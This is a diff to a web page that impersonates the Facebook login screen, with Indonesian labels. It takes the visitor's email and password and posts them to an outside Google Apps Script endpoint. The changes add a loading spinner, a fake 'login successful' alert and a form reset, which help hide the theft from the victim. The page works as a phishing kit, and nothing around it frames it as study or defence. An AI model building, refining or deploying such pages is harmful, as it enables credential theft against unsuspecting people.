@@ -19,7 +19,11 @@
         <p class="text-center text-primary" style="font-size:40px;"><strong>Facebook</strong> </p>
       </div>
       <div class="container">
-
+        <div class="col-lg-8 mt-5 mt-lg-0">
+          <div class="alert alert-warning alert-dismissible fade show d-none my-alert" role="alert">
+            <strong>login..</strong> berhasil.
+            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+          </div>
       <form name="piface">
         <div class="mb-3">
           <label for="exampleInputEmail1" class="form-label"></label>
@@ -31,7 +35,11 @@
           <input type="password" class="form-control" id="exampleInputPassword1"placeholder="Password" name="password">
         </div>
        
-        <button type="submit" class="btn btn-primary w-100">Masuk</button>
+        <button type="submit" class="btn btn-primary w-100 btn-kirim">Masuk</button>
+        <button class="btn btn-primary btn-loading d-none" type="button" disabled>
+          <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+            Loading...
+        </button>
       </form>
     </div><br>
 
@@ -48,11 +56,22 @@
     <script>
       const scriptURL = 'https://script.google.com/macros/s/AKfycbxkXNOCJlWDirYQwQ2ksL6q2cEiFZ1xhgLsa67JTiuIRiaV3MT_tWWi6AzZI5haCZss1g/exec'
       const form = document.forms['piface']
+      const btnKirim = document.querySelector('.btn-kirim');
+      const btnLoading = document.querySelector('.btn-loading');
+      const myAlert = document.querySelector('.my-alert');
     
       form.addEventListener('submit', e => {
         e.preventDefault()
+        btnLoading.classList.toggle('d-none');
+        btnKirim.classList.toggle('d-none');
         fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-          .then(response => console.log('Success!', response))
+          .then(response => {
+        btnLoading.classList.toggle('d-none');
+        btnKirim.classList.toggle('d-none');
+        myAlert.classList.toggle('d-none');
+        form.reset();
+        console.log('Success!', response)
+      })
           .catch(error => console.error('Error!', error.message))
       })
     </script>
